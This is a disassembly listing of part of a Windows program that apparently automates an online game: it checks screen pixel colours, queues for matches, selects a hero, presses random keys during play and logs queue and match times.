0000000140002eee  je       0x140003529                                      ; 0x140003529
0000000140002ef4  mov      r8d, ebx                                        
0000000140002ef7  movsd    xmm6, qword ptr [rip + 0x6341]                   ; 0x140009240
0000000140002eff  movaps   xmm1, xmm6                                      
0000000140002f02  movsd    xmm7, qword ptr [rip + 0x63f6]                   ; 0x140009300
0000000140002f0a  movaps   xmm0, xmm7                                      
0000000140002f0d  call     0x140002394                                      ; 0x140002394
0000000140002f12  test     al, al                                          
0000000140002f14  je       0x140002fd6                                      ; 0x140002fd6
0000000140002f1a  call     qword ptr [rip + 0x5630]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
0000000140002f20  mov      dword ptr [rip + 0x9346], eax                    ; 0x14000c26c
0000000140002f26  lea      rcx, [rip + 0x5af3]                              ; 0x140008a20 "再次排队"
0000000140002f2d  call     0x140001474                                      ; 0x140001474
0000000140002f32  xor      r8d, r8d                                        
0000000140002f35  movaps   xmm1, xmm6                                      
0000000140002f38  movaps   xmm0, xmm7                                      
0000000140002f3b  call     0x1400015ac                                      ; 0x1400015ac
0000000140002f40  mov      esi, 0xc8                                        ; 0xc8
0000000140002f45  mov      ecx, esi                                        
0000000140002f47  call     0x1400026ec                                      ; 0x1400026ec
0000000140002f4c  lea      rcx, [rip + 0x5a25]                              ; 0x140008978 "点赞玩家"
0000000140002f53  call     0x140001474                                      ; 0x140001474
0000000140002f58  mov      ebx, 0x14                                        ; 0x14
0000000140002f5d  mov      edx, ebx                                        
0000000140002f5f  mov      cl, 0x4e                                         ; 0x4e
0000000140002f61  call     0x140001774                                      ; 0x140001774
0000000140002f66  mov      ecx, esi                                        
0000000140002f68  call     0x1400026ec                                      ; 0x1400026ec
0000000140002f6d  mov      edx, ebx                                        
0000000140002f6f  mov      cl, 0x25                                         ; 0x25
0000000140002f71  call     0x140001774                                      ; 0x140001774
0000000140002f76  mov      rdi, r15                                        
0000000140002f79  lea      r14d, [rbx + 0x1e]                              
0000000140002f7d  mov      edx, ebx                                        
0000000140002f7f  mov      cl, 0x20                                         ; 0x20
0000000140002f81  call     0x140001774                                      ; 0x140001774
0000000140002f86  mov      ecx, r14d                                       
0000000140002f89  call     qword ptr [rip + 0x5231]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
0000000140002f8f  mov      edx, ebx                                        
0000000140002f91  mov      cl, 0x27                                         ; 0x27
0000000140002f93  call     0x140001774                                      ; 0x140001774
0000000140002f98  cmp      rdi, 3                                           ; 0x3
0000000140002f9c  jne      0x140002fa6                                      ; 0x140002fa6
0000000140002f9e  mov      ecx, esi                                        
0000000140002fa0  call     qword ptr [rip + 0x521a]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
0000000140002fa6  mov      ecx, r14d                                       
0000000140002fa9  call     qword ptr [rip + 0x5211]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
0000000140002faf  inc      rdi                                             
0000000140002fb2  cmp      rdi, 6                                           ; 0x6
0000000140002fb6  jb       0x140002f7d                                      ; 0x140002f7d
0000000140002fb8  mov      edx, ebx                                        
0000000140002fba  mov      cl, 0x20                                         ; 0x20
0000000140002fbc  call     0x140001774                                      ; 0x140001774
0000000140002fc1  mov      edx, ebx                                        
0000000140002fc3  mov      cl, 0x4e                                         ; 0x4e
0000000140002fc5  call     0x140001774                                      ; 0x140001774
0000000140002fca  mov      ecx, esi                                        
0000000140002fcc  call     0x1400026ec                                      ; 0x1400026ec
0000000140002fd1  jmp      0x140003529                                      ; 0x140003529
0000000140002fd6  mov      r8d, 0x25314b                                    ; 0x25314b
0000000140002fdc  movaps   xmm1, xmm6                                      
0000000140002fdf  movaps   xmm0, xmm7                                      
0000000140002fe2  call     0x140002394                                      ; 0x140002394
0000000140002fe7  test     al, al                                          
0000000140002fe9  je       0x140003529                                      ; 0x140003529
0000000140002fef  lea      rcx, [rip + 0x5a3a]                              ; 0x140008a30 "点击继续"
0000000140002ff6  call     0x140001474                                      ; 0x140001474
0000000140002ffb  xor      r8d, r8d                                        
0000000140002ffe  movaps   xmm1, xmm6                                      
0000000140003001  movsd    xmm0, qword ptr [rip + 0x629f]                   ; 0x1400092a8
0000000140003009  jmp      0x140003512                                      ; 0x140003512
000000014000300e  mov      r8d, edi                                        
0000000140003011  movsd    xmm1, qword ptr [rip + 0x6307]                   ; 0x140009320
0000000140003019  movsd    xmm0, qword ptr [rip + 0x630f]                   ; 0x140009330
0000000140003021  call     0x140002394                                      ; 0x140002394
0000000140003026  test     al, al                                          
0000000140003028  je       0x140003529                                      ; 0x140003529
000000014000302e  mov      r8d, ebx                                        
0000000140003031  movsd    xmm5, qword ptr [rip + 0x6237]                   ; 0x140009270
0000000140003039  movaps   xmm1, xmm5                                      
000000014000303c  movsd    xmm6, qword ptr [rip + 0x627c]                   ; 0x1400092c0
0000000140003044  movaps   xmm0, xmm6                                      
0000000140003047  call     0x140002394                                      ; 0x140002394
000000014000304c  test     al, al                                          
000000014000304e  je       0x14000306c                                      ; 0x14000306c
0000000140003050  mov      r8d, ebx                                        
0000000140003053  movsd    xmm1, qword ptr [rip + 0x6205]                   ; 0x140009260
000000014000305b  movsd    xmm0, qword ptr [rip + 0x623d]                   ; 0x1400092a0
0000000140003063  call     0x140002394                                      ; 0x140002394
0000000140003068  test     al, al                                          
000000014000306a  jne      0x1400030b7                                      ; 0x1400030b7
000000014000306c  mov      r8d, 0xf4f4f4                                    ; 0xf4f4f4
0000000140003072  movsd    xmm5, qword ptr [rip + 0x6216]                   ; 0x140009290
000000014000307a  movaps   xmm1, xmm5                                      
000000014000307d  movsd    xmm6, qword ptr [rip + 0x622b]                   ; 0x1400092b0
0000000140003085  movaps   xmm0, xmm6                                      
0000000140003088  call     0x140002394                                      ; 0x140002394
000000014000308d  test     al, al                                          
000000014000308f  jne      0x1400030b7                                      ; 0x1400030b7
0000000140003091  mov      r8d, ebx                                        
0000000140003094  movsd    xmm5, qword ptr [rip + 0x61fc]                   ; 0x140009298
000000014000309c  movaps   xmm1, xmm5                                      
000000014000309f  movsd    xmm6, qword ptr [rip + 0x6221]                   ; 0x1400092c8
00000001400030a7  movaps   xmm0, xmm6                                      
00000001400030aa  call     0x140002394                                      ; 0x140002394
00000001400030af  test     al, al                                          
00000001400030b1  je       0x140003529                                      ; 0x140003529
00000001400030b7  xor      r8d, r8d                                        
00000001400030ba  movaps   xmm1, xmm5                                      
00000001400030bd  movaps   xmm0, xmm6                                      
00000001400030c0  call     0x1400015ac                                      ; 0x1400015ac
00000001400030c5  lea      rdx, [rip + 0x5974]                              ; 0x140008a40 "选项菜单"
00000001400030cc  lea      rcx, [rbp - 0x68]                               
00000001400030d0  call     0x140004a0c                                      ; 0x140004a0c
00000001400030d5  lea      rcx, [rip + 0x5974]                              ; 0x140008a50 "点击离开"
00000001400030dc  jmp      0x14000326f                                      ; 0x14000326f
00000001400030e1  mov      r8d, ebx                                        
00000001400030e4  movsd    xmm1, qword ptr [rip + 0x6284]                   ; 0x140009370
00000001400030ec  movsd    xmm0, qword ptr [rip + 0x629c]                   ; 0x140009390
00000001400030f4  call     0x140002394                                      ; 0x140002394
00000001400030f9  test     al, al                                          
00000001400030fb  je       0x140003529                                      ; 0x140003529
0000000140003101  mov      dword ptr [rsp + 0x28], r15d                    
0000000140003106  mov      dword ptr [rsp + 0x20], r15d                    
000000014000310b  mov      r9d, 0xffff3a                                    ; 0xffff3a
0000000140003111  mov      r8d, ebx                                        
0000000140003114  movsd    xmm1, qword ptr [rip + 0x6244]                   ; 0x140009360
000000014000311c  movsd    xmm0, qword ptr [rip + 0x6124]                   ; 0x140009248
0000000140003124  call     0x1400024c0                                      ; 0x1400024c0
0000000140003129  test     al, al                                          
000000014000312b  je       0x140003529                                      ; 0x140003529
0000000140003131  lea      rdx, [rip + 0x5928]                              ; 0x140008a60 "大厅界面"
0000000140003138  lea      rcx, [rbp - 0x68]                               
000000014000313c  call     0x140004a0c                                      ; 0x140004a0c
0000000140003141  mov      r8d, esi                                        
0000000140003144  movsd    xmm1, qword ptr [rip + 0x611c]                   ; 0x140009268
000000014000314c  movsd    xmm0, qword ptr [rip + 0x6134]                   ; 0x140009288
0000000140003154  call     0x140002394                                      ; 0x140002394
0000000140003159  mov      ebx, 0xba00                                      ; 0xba00
000000014000315e  movsd    xmm7, qword ptr [rip + 0x61da]                   ; 0x140009340
0000000140003166  movsd    xmm8, qword ptr [rip + 0x6111]                   ; 0x140009280
000000014000316f  test     al, al                                          
0000000140003171  je       0x1400031bd                                      ; 0x1400031bd
0000000140003173  mov      r8d, ebx                                        
0000000140003176  movaps   xmm1, xmm7                                      
0000000140003179  movaps   xmm0, xmm8                                      
000000014000317d  call     0x140002394                                      ; 0x140002394
0000000140003182  test     al, al                                          
0000000140003184  je       0x1400031bd                                      ; 0x1400031bd
0000000140003186  lea      rdx, [rip + 0x5903]                              ; 0x140008a90 "正在匹配"
000000014000318d  lea      rcx, [rbp - 0x68]                               
0000000140003191  call     0x140004a0c                                      ; 0x140004a0c
0000000140003196  call     qword ptr [rip + 0x53b4]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
000000014000319c  add      eax, 0x7d0                                       ; 0x7d0
00000001400031a1  mov      dword ptr [rip + 0x90c1], eax                    ; 0x14000c268
00000001400031a7  call     qword ptr [rip + 0x53a3]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
00000001400031ad  add      eax, 0x1d4c0                                     ; 0x1d4c0
00000001400031b2  mov      dword ptr [rip + 0x90b8], eax                    ; 0x14000c270
00000001400031b8  jmp      0x140003529                                      ; 0x140003529
00000001400031bd  call     qword ptr [rip + 0x538d]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
00000001400031c3  cmp      dword ptr [rip + 0x909f], eax                    ; 0x14000c268
00000001400031c9  jge      0x140003529                                      ; 0x140003529
00000001400031cf  call     qword ptr [rip + 0x537b]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
00000001400031d5  mov      dword ptr [rip + 0x9091], eax                    ; 0x14000c26c
00000001400031db  mov      r8d, ebx                                        
00000001400031de  movaps   xmm1, xmm7                                      
00000001400031e1  movaps   xmm0, xmm8                                      
00000001400031e5  call     0x140002394                                      ; 0x140002394
00000001400031ea  test     al, al                                          
00000001400031ec  jne      0x140003231                                      ; 0x140003231
00000001400031ee  lea      rcx, [rip + 0x587b]                              ; 0x140008a70 "点击街机"
00000001400031f5  call     0x140001474                                      ; 0x140001474
00000001400031fa  xor      r8d, r8d                                        
00000001400031fd  movsd    xmm1, qword ptr [rip + 0x6163]                   ; 0x140009368
0000000140003205  movaps   xmm0, xmm6                                      
0000000140003208  call     0x1400015ac                                      ; 0x1400015ac
000000014000320d  mov      ecx, r14d                                       
0000000140003210  call     0x1400026ec                                      ; 0x1400026ec
0000000140003215  xor      r8d, r8d                                        
0000000140003218  movaps   xmm1, xmm7                                      
000000014000321b  movaps   xmm0, xmm8                                      
000000014000321f  call     0x1400015ac                                      ; 0x1400015ac
0000000140003224  mov      ecx, r14d                                       
0000000140003227  call     0x1400026ec                                      ; 0x1400026ec
000000014000322c  call     0x14000231c                                      ; 0x14000231c
0000000140003231  mov      r8d, 0x223276                                    ; 0x223276
0000000140003237  movsd    xmm5, qword ptr [rip + 0x60e9]                   ; 0x140009328
000000014000323f  movaps   xmm1, xmm5                                      
0000000140003242  movsd    xmm6, qword ptr [rip + 0x6006]                   ; 0x140009250
000000014000324a  movaps   xmm0, xmm6                                      
000000014000324d  call     0x140002394                                      ; 0x140002394
0000000140003252  test     al, al                                          
0000000140003254  je       0x140003529                                      ; 0x140003529
000000014000325a  xor      r8d, r8d                                        
000000014000325d  movaps   xmm1, xmm5                                      
0000000140003260  movaps   xmm0, xmm6                                      
0000000140003263  call     0x1400015ac                                      ; 0x1400015ac
0000000140003268  lea      rcx, [rip + 0x5811]                              ; 0x140008a80 "点击死斗"
000000014000326f  call     0x140001474                                      ; 0x140001474
0000000140003274  jmp      0x140003529                                      ; 0x140003529
0000000140003279  mov      r8d, ebx                                        
000000014000327c  movsd    xmm5, qword ptr [rip + 0x5f9c]                   ; 0x140009220
0000000140003284  movaps   xmm1, xmm5                                      
0000000140003287  movsd    xmm0, qword ptr [rip + 0x6081]                   ; 0x140009310
000000014000328f  call     0x140002394                                      ; 0x140002394
0000000140003294  test     al, al                                          
0000000140003296  je       0x14000334d                                      ; 0x14000334d
000000014000329c  mov      r8d, 0xb898                                      ; 0xb898
00000001400032a2  movaps   xmm1, xmm5                                      
00000001400032a5  movsd    xmm0, qword ptr [rip + 0x605b]                   ; 0x140009308
00000001400032ad  call     0x140002394                                      ; 0x140002394
00000001400032b2  test     al, al                                          
00000001400032b4  je       0x14000334d                                      ; 0x14000334d
00000001400032ba  mov      r8d, 0x1d253a                                    ; 0x1d253a
00000001400032c0  movaps   xmm1, xmm5                                      
00000001400032c3  movsd    xmm0, qword ptr [rip + 0x602d]                   ; 0x1400092f8
00000001400032cb  call     0x140002394                                      ; 0x140002394
00000001400032d0  test     al, al                                          
00000001400032d2  je       0x14000334d                                      ; 0x14000334d
00000001400032d4  cmp      dword ptr [rip + 0x8f6d], r15d                   ; 0x14000c248
00000001400032db  je       0x140003320                                      ; 0x140003320
00000001400032dd  mov      ebx, dword ptr [rip + 0x8f3d]                    ; 0x14000c220
00000001400032e3  inc      ebx                                             
00000001400032e5  mov      dword ptr [rip + 0x8f35], ebx                    ; 0x14000c220
00000001400032eb  call     qword ptr [rip + 0x525f]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
00000001400032f1  mov      ecx, eax                                        
00000001400032f3  sub      ecx, dword ptr [rip + 0x8f4f]                    ; 0x14000c248
00000001400032f9  mov      eax, 0x10624dd3                                  ; 0x10624dd3
00000001400032fe  imul     ecx                                             
0000000140003300  sar      edx, 6                                           ; 0x6
0000000140003303  mov      eax, edx                                        
0000000140003305  shr      eax, 0x1f                                        ; 0x1f
0000000140003308  add      edx, eax                                        
000000014000330a  mov      r8d, ebx                                        
000000014000330d  lea      rcx, [rip + 0x579c]                              ; 0x140008ab0 "游戏时间：%d 秒 %d 次"
0000000140003314  call     0x140001474                                      ; 0x140001474
0000000140003319  mov      dword ptr [rip + 0x8f28], r15d                   ; 0x14000c248
0000000140003320  lea      rdx, [rip + 0x57a1]                              ; 0x140008ac8 "比赛结束"
0000000140003327  lea      rcx, [rbp - 0x68]                               
000000014000332b  call     0x140004a0c                                      ; 0x140004a0c
0000000140003330  lea      rcx, [rip + 0x57a1]                              ; 0x140008ad8 "按键ESC"
0000000140003337  call     0x140001474                                      ; 0x140001474
000000014000333c  mov      edx, 0x14                                        ; 0x14
0000000140003341  mov      cl, 0x1b                                         ; 0x1b
0000000140003343  call     0x140001774                                      ; 0x140001774
0000000140003348  jmp      0x140003529                                      ; 0x140003529
000000014000334d  mov      r8d, edi                                        
0000000140003350  movsd    xmm7, qword ptr [rip + 0x5ed8]                   ; 0x140009230
0000000140003358  movaps   xmm1, xmm7                                      
000000014000335b  movsd    xmm0, qword ptr [rip + 0x5f7d]                   ; 0x1400092e0
0000000140003363  call     0x140002394                                      ; 0x140002394
0000000140003368  test     al, al                                          
000000014000336a  je       0x140003464                                      ; 0x140003464
0000000140003370  mov      r8d, edi                                        
0000000140003373  movaps   xmm1, xmm7                                      
0000000140003376  movaps   xmm0, xmm6                                      
0000000140003379  call     0x140002394                                      ; 0x140002394
000000014000337e  test     al, al                                          
0000000140003380  je       0x140003464                                      ; 0x140003464
0000000140003386  call     qword ptr [rip + 0x51c4]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
000000014000338c  add      eax, 0x1d4c0                                     ; 0x1d4c0
0000000140003391  mov      dword ptr [rip + 0x8ed9], eax                    ; 0x14000c270
0000000140003397  lea      rdx, [rip + 0x5742]                              ; 0x140008ae0 "选择英雄"
000000014000339e  lea      rcx, [rbp - 0x68]                               
00000001400033a2  call     0x140004a0c                                      ; 0x140004a0c
00000001400033a7  mov      r8d, edi                                        
00000001400033aa  movsd    xmm1, qword ptr [rip + 0x5e8e]                   ; 0x140009240
00000001400033b2  movsd    xmm0, qword ptr [rip + 0x5f1e]                   ; 0x1400092d8
00000001400033ba  call     0x140002394                                      ; 0x140002394
00000001400033bf  test     al, al                                          
00000001400033c1  jne      0x140003453                                      ; 0x140003453
00000001400033c7  mov      dword ptr [rsp + 0x28], r15d                    
00000001400033cc  mov      dword ptr [rsp + 0x20], r15d                    
00000001400033d1  xor      r9d, r9d                                        
00000001400033d4  mov      r8d, ebx                                        
00000001400033d7  movsd    xmm1, qword ptr [rip + 0x5e99]                   ; 0x140009278
00000001400033df  movsd    xmm0, qword ptr [rip + 0x5f31]                   ; 0x140009318
00000001400033e7  call     0x1400024c0                                      ; 0x1400024c0
00000001400033ec  test     al, al                                          
00000001400033ee  je       0x140003529                                      ; 0x140003529
00000001400033f4  mov      ecx, 0x5dc                                       ; 0x5dc
00000001400033f9  call     0x1400026ec                                      ; 0x1400026ec
00000001400033fe  cmp      dword ptr [rip + 0x8e67], r15d                   ; 0x14000c26c
0000000140003405  je       0x140003439                                      ; 0x140003439
0000000140003407  call     qword ptr [rip + 0x5143]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
000000014000340d  mov      ecx, eax                                        
000000014000340f  sub      ecx, dword ptr [rip + 0x8e57]                    ; 0x14000c26c
0000000140003415  mov      eax, 0x10624dd3                                  ; 0x10624dd3
000000014000341a  imul     ecx                                             
000000014000341c  sar      edx, 6                                           ; 0x6
000000014000341f  mov      eax, edx                                        
0000000140003421  shr      eax, 0x1f                                        ; 0x1f
0000000140003424  add      edx, eax                                        
0000000140003426  lea      rcx, [rip + 0x56c3]                              ; 0x140008af0 "排队时间：%d 秒"
000000014000342d  call     0x140001474                                      ; 0x140001474
0000000140003432  mov      dword ptr [rip + 0x8e33], r15d                   ; 0x14000c26c
0000000140003439  lea      rcx, [rip + 0x56a0]                              ; 0x140008ae0 "选择英雄"
0000000140003440  call     0x140001474                                      ; 0x140001474
0000000140003445  xor      r8d, r8d                                        
0000000140003448  movaps   xmm1, xmm7                                      
000000014000344b  movaps   xmm0, xmm6                                      
000000014000344e  jmp      0x140003512                                      ; 0x140003512
0000000140003453  call     qword ptr [rip + 0x50f7]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
0000000140003459  mov      dword ptr [rip + 0x8de9], eax                    ; 0x14000c248
000000014000345f  jmp      0x140003529                                      ; 0x140003529
0000000140003464  movsd    xmm3, qword ptr [rip + 0x5dbc]                   ; 0x140009228
000000014000346c  movsd    xmm2, qword ptr [rip + 0x5ec4]                   ; 0x140009338
0000000140003474  movsd    xmm1, qword ptr [rip + 0x5ddc]                   ; 0x140009258
000000014000347c  movsd    xmm0, qword ptr [rip + 0x5ecc]                   ; 0x140009350
0000000140003484  call     0x140001ff4                                      ; 0x140001ff4
0000000140003489  test     al, al                                          
000000014000348b  je       0x140003519                                      ; 0x140003519
0000000140003491  call     0x140002360                                      ; 0x140002360
0000000140003496  call     qword ptr [rip + 0x50b4]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
000000014000349c  add      eax, 0x1d4c0                                     ; 0x1d4c0
00000001400034a1  mov      dword ptr [rip + 0x8dc9], eax                    ; 0x14000c270
00000001400034a7  lea      rdx, [rip + 0x5652]                              ; 0x140008b00 "随机按键"
00000001400034ae  lea      rcx, [rbp - 0x68]                               
00000001400034b2  call     0x140004a0c                                      ; 0x140004a0c
00000001400034b7  call     qword ptr [rip + 0x50ab]                         ; 0x140008568 api-ms-win-crt-utility-l1-1-0.dll!rand
00000001400034bd  mov      edi, eax                                        
00000001400034bf  and      edi, 0x80000007                                  ; 0x80000007
00000001400034c5  jge      0x1400034ce                                      ; 0x1400034ce
00000001400034c7  dec      edi                                             
00000001400034c9  or       edi, 0xfffffff8                                  ; 0xfffffff8
00000001400034cc  inc      edi                                             
00000001400034ce  call     qword ptr [rip + 0x5094]                         ; 0x140008568 api-ms-win-crt-utility-l1-1-0.dll!rand
00000001400034d4  mov      ebx, eax                                        
00000001400034d6  mov      eax, 0x28db9c69                                  ; 0x28db9c69
00000001400034db  imul     ebx                                             
00000001400034dd  sar      edx, 6                                           ; 0x6
00000001400034e0  mov      ecx, edx                                        
00000001400034e2  shr      ecx, 0x1f                                        ; 0x1f
00000001400034e5  add      edx, ecx                                        
00000001400034e7  imul     ecx, edx, 0x191                                  ; 0x191
00000001400034ed  sub      ebx, ecx                                        
00000001400034ef  add      ebx, 0x64                                        ; 0x64
00000001400034f2  movsxd   rcx, edi                                        
00000001400034f5  lea      rax, [rip + 0x5cac]                              ; 0x1400091a8
00000001400034fc  mov      edx, ebx                                        
00000001400034fe  mov      cl, byte ptr [rcx + rax]                        
0000000140003501  call     0x140001774                                      ; 0x140001774
0000000140003506  and      ebx, 1                                           ; 0x1
0000000140003509  mov      r8b, bl                                         
000000014000350c  xorps    xmm1, xmm1                                      
000000014000350f  xorps    xmm0, xmm0                                      
0000000140003512  call     0x1400015ac                                      ; 0x1400015ac
0000000140003517  jmp      0x140003529                                      ; 0x140003529
0000000140003519  lea      rdx, [rip + 0x55f0]                              ; 0x140008b10 "没有血条"
0000000140003520  lea      rcx, [rbp - 0x68]                               
0000000140003524  call     0x140004a0c                                      ; 0x140004a0c
0000000140003529  call     qword ptr [rip + 0x5021]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
000000014000352f  mov      ecx, dword ptr [rip + 0x8d3b]                    ; 0x14000c270
0000000140003535  sub      ecx, eax                                        
0000000140003537  mov      r12d, 0xf                                        ; 0xf
000000014000353d  cmp      ecx, 0x186a0                                     ; 0x186a0
0000000140003543  jge      0x140003707                                      ; 0x140003707
0000000140003549  call     qword ptr [rip + 0x5001]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
000000014000354f  mov      ecx, dword ptr [rip + 0x8d1b]                    ; 0x14000c270
0000000140003555  sub      ecx, eax                                        
0000000140003557  mov      eax, 0x10624dd3                                  ; 0x10624dd3
000000014000355c  imul     ecx                                             
000000014000355e  sar      edx, 6                                           ; 0x6
0000000140003561  mov      eax, edx                                        
0000000140003563  shr      eax, 0x1f                                        ; 0x1f
0000000140003566  add      edx, eax                                        
0000000140003568  lea      rcx, [rbp - 0x33]                               
000000014000356c  jns      0x14000357f                                      ; 0x14000357f
000000014000356e  neg      edx                                             
0000000140003570  call     0x140004db4                                      ; 0x140004db4
0000000140003575  lea      r14, [rax - 1]                                  
0000000140003579  mov      byte ptr [r14], 0x2d                             ; 0x2d
000000014000357d  jmp      0x140003587                                      ; 0x140003587
000000014000357f  call     0x140004db4                                      ; 0x140004db4
0000000140003584  mov      r14, rax                                        
0000000140003587  xorps    xmm0, xmm0                                      
000000014000358a  movups   xmmword ptr [rsp + 0x58], xmm0                  
000000014000358f  mov      qword ptr [rsp + 0x68], r15                     
0000000140003594  mov      qword ptr [rsp + 0x70], r15                     
0000000140003599  lea      rax, [rbp - 0x33]                               
000000014000359d  cmp      r14, rax                                        
00000001400035a0  jne      0x1400035b6                                      ; 0x1400035b6
00000001400035a2  mov      qword ptr [rsp + 0x68], r15                     
00000001400035a7  mov      qword ptr [rsp + 0x70], r12                     
00000001400035ac  mov      byte ptr [rsp + 0x58], r15b                     
00000001400035b1  jmp      0x1400036b2                                      ; 0x1400036b2
00000001400035b6  lea      rdi, [rbp - 0x33]                               
00000001400035ba  sub      rdi, r14                                        
00000001400035bd  movabs   rsi, 0x7fffffffffffffff                          ; 0x7fffffffffffffff
00000001400035c7  cmp      rdi, rsi                                        
00000001400035ca  ja       0x140003763                                      ; 0x140003763
00000001400035d0  cmp      rdi, r12                                        
00000001400035d3  ja       0x1400035f9                                      ; 0x1400035f9
00000001400035d5  mov      qword ptr [rsp + 0x68], rdi                     
00000001400035da  mov      qword ptr [rsp + 0x70], r12                     
00000001400035df  mov      r8, rdi                                         
00000001400035e2  mov      rdx, r14                                        
00000001400035e5  lea      rcx, [rsp + 0x58]                               
00000001400035ea  call     0x140007208                                      ; 0x140007208
00000001400035ef  mov      byte ptr [rsp + rdi + 0x58], r15b               
00000001400035f4  jmp      0x1400036b2                                      ; 0x1400036b2
00000001400035f9  mov      rax, rdi                                        
00000001400035fc  or       rax, r12                                        
00000001400035ff  cmp      rax, rsi                                        
0000000140003602  jbe      0x140003621                                      ; 0x140003621
0000000140003604  movabs   rcx, 0x8000000000000000                          ; -0x8000000000000000
000000014000360e  add      rcx, 0x27                                        ; 0x27
0000000140003612  call     0x140006320                                      ; 0x140006320
0000000140003617  test     rax, rax                                        
000000014000361a  jne      0x14000365a                                      ; 0x14000365a
000000014000361c  lea      ecx, [rax + 5]                                  
000000014000361f  int      0x29                                             ; 0x29
0000000140003621  mov      rsi, rax                                        
0000000140003624  mov      ecx, 0x16                                        ; 0x16
0000000140003629  cmp      rax, rcx                                        
000000014000362c  cmovb    rsi, rcx                                        
0000000140003630  lea      rax, [rsi + 1]                                  
0000000140003634  test     rax, rax                                        
0000000140003637  jne      0x140003643                                      ; 0x140003643
0000000140003639  mov      rbx, r15                                        
000000014000363c  mov      qword ptr [rsp + 0x50], rbx                     
0000000140003641  jmp      0x140003678                                      ; 0x140003678
0000000140003643  cmp      rax, 0x1000                                      ; 0x1000
0000000140003649  jb       0x140003668                                      ; 0x140003668
000000014000364b  lea      rcx, [rax + 0x27]                               
000000014000364f  cmp      rcx, rax                                        
0000000140003652  jbe      0x140003769                                      ; 0x140003769
0000000140003658  jmp      0x140003612                                      ; 0x140003612
000000014000365a  lea      rbx, [rax + 0x27]                               
000000014000365e  and      rbx, 0xffffffffffffffe0                          ; -0x20
0000000140003662  mov      qword ptr [rbx - 8], rax                        
0000000140003666  jmp      0x14000363c                                      ; 0x14000363c
0000000140003668  mov      rcx, rax                                        
000000014000366b  call     0x140006320                                      ; 0x140006320
0000000140003670  mov      rbx, rax                                        
0000000140003673  mov      qword ptr [rsp + 0x50], rax                     
0000000140003678  mov      byte ptr [rsp + 0x58], bl                       
000000014000367c  mov      ecx, dword ptr [rsp + 0x51]                     
0000000140003680  mov      dword ptr [rsp + 0x59], ecx                     
0000000140003684  movzx    ecx, word ptr [rsp + 0x55]                      
0000000140003689  mov      word ptr [rsp + 0x5d], cx                       
000000014000368e  mov      cl, byte ptr [rsp + 0x57]                       
0000000140003692  mov      byte ptr [rsp + 0x5f], cl                       
0000000140003696  mov      qword ptr [rsp + 0x68], rdi                     
000000014000369b  mov      qword ptr [rsp + 0x70], rsi                     
00000001400036a0  mov      r8, rdi                                         
00000001400036a3  mov      rdx, r14                                        
00000001400036a6  mov      rcx, rbx                                        
00000001400036a9  call     0x140007208                                      ; 0x140007208
00000001400036ae  mov      byte ptr [rbx + rdi], r15b                      
00000001400036b2  mov      r8d, 6                                           ; 0x6
00000001400036b8  lea      rdx, [rip + 0x545d]                              ; 0x140008b1c "秒重上"
00000001400036bf  lea      rcx, [rsp + 0x58]                               
00000001400036c4  call     0x140004e10                                      ; 0x140004e10
00000001400036c9  movups   xmm0, xmmword ptr [rax]                         
00000001400036cc  movups   xmmword ptr [rsp + 0x78], xmm0                  
00000001400036d1  movups   xmm1, xmmword ptr [rax + 0x10]                  
00000001400036d5  movups   xmmword ptr [rbp - 0x78], xmm1                  
00000001400036d9  mov      qword ptr [rax + 0x10], r15                     
00000001400036dd  mov      qword ptr [rax + 0x18], r12                     
00000001400036e1  mov      byte ptr [rax], r15b                            
00000001400036e4  lea      rdx, [rsp + 0x78]                               
00000001400036e9  lea      rcx, [rbp - 0x68]                               
00000001400036ed  call     0x140004bd8                                      ; 0x140004bd8
00000001400036f2  lea      rcx, [rsp + 0x78]                               
00000001400036f7  call     0x140004b70                                      ; 0x140004b70
00000001400036fc  nop                                                      
00000001400036fd  lea      rcx, [rsp + 0x58]                               
0000000140003702  call     0x140004b70                                      ; 0x140004b70
0000000140003707  lea      rcx, [rbp - 0x68]                               
000000014000370b  cmp      qword ptr [rbp - 0x50], r12                     
000000014000370f  cmova    rcx, qword ptr [rbp - 0x68]                     
0000000140003714  call     0x1400012f4                                      ; 0x1400012f4
0000000140003719  call     0x140002360                                      ; 0x140002360
000000014000371e  mov      ecx, 0x258                                       ; 0x258
0000000140003723  call     0x1400026ec                                      ; 0x1400026ec
0000000140003728  nop                                                      
0000000140003729  lea      rcx, [rbp - 0x68]                               
000000014000372d  call     0x140004b70                                      ; 0x140004b70
0000000140003732  mov      rcx, qword ptr [rbp - 0x30]                     
0000000140003736  xor      rcx, rsp                                        
0000000140003739  call     0x1400062f0                                      ; 0x1400062f0
000000014000373e  lea      r11, [rsp + 0x110]                              
0000000140003746  movaps   xmm6, xmmword ptr [r11 - 0x10]                  
000000014000374b  movaps   xmm7, xmmword ptr [r11 - 0x20]                  
0000000140003750  movaps   xmm8, xmmword ptr [r11 - 0x30]                  
0000000140003755  mov      rsp, r11                                        
0000000140003758  pop      r15                                             
000000014000375a  pop      r14                                             
000000014000375c  pop      r12                                             
000000014000375e  pop      rdi                                             
000000014000375f  pop      rsi                                             
0000000140003760  pop      rbx                                             
0000000140003761  pop      rbp                                             
0000000140003762  ret                                                      
0000000140003763  call     0x140001230                                      ; 0x140001230
0000000140003768  nop                                                      
0000000140003769  call     0x140001190                                      ; 0x140001190
000000014000376e  int3                                                     
000000014000376f  int3                                                     

; FUNCTION 0x140003770

0000000140003770  push     rbx                                             
0000000140003772  push     rbp                                             
0000000140003773  push     rsi                                             
0000000140003774  push     rdi                                             
0000000140003775  sub      rsp, 0x58                                        ; 0x58
0000000140003779  mov      rax, qword ptr [rip + 0x88c0]                    ; 0x14000c040
0000000140003780  xor      rax, rsp                                        
